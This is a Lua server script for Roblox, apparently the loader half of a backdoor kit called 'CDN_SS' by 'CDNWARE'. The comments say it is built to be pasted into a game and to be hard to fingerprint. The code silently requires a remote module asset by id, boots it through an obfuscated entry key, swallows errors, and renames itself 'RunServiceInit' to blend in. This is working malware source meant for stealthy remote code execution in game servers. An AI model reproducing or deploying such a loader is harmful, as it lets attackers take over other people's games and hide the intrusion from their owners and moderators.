--!nocheck
--------------------------------------------------------------------------------
-- CDN_SS :: LOADER  (server script)
-- by CDNWARE
--
-- This is the ONLY thing you place inside a game. It is intentionally tiny so
-- it is trivial to paste, hard to fingerprint, and does nothing on its own
-- besides silently pulling the MainModule.
--
-- Deployment:
--   1. Publish the MainModule folder as a model asset (ModuleScript).
--   2. Paste the asset id into MAIN_MODULE_ID below.
--   3. Paste this script into a Script instance in ServerScriptService (or run
--      it from any server-side context you already control).
--
-- The loader never prints, never warns on success, and cleans itself up.
--------------------------------------------------------------------------------

local MAIN_MODULE_ID = 0 -- <-- your MainModule asset id

-- Optional shared key. The MainModule refuses to boot without it when set.
local ACCESS_KEY = "CDNWARE"

local RunService = game:GetService("RunService")

local Loader = {}

function Loader.boot()
    if not RunService:IsServer() then
        return false, "client context"
    end

    local ok, module = pcall(require, MAIN_MODULE_ID)
    if not ok or type(module) ~= "table" then
        return false, "module require failed"
    end

    -- The MainModule is keyed with a random table index so a leaked asset id
    -- alone is never enough to run it.
    local entry = module.ehhsdiweew
    if type(entry) ~= "function" then
        return false, "module entry missing"
    end

    local bootOk, err = pcall(entry, {
        key = ACCESS_KEY,
        origin = "loader",
        silent = true,
    })
    if not bootOk then
        return false, tostring(err)
    end

    return true
end

-- Silent boot: errors are swallowed unless CDN_SS_DEBUG is set in the server.
do
    local ok, err = Loader.boot()
    if not ok and game:GetService("ServerStorage"):FindFirstChild("CDN_SS_DEBUG") then
        warn("[CDN_SS] loader failed:", err)
    end
end

-- Hide the loader: drop the reference and rename ourselves to blend in.
script.Name = "RunServiceInit"
Loader = nil

return nil
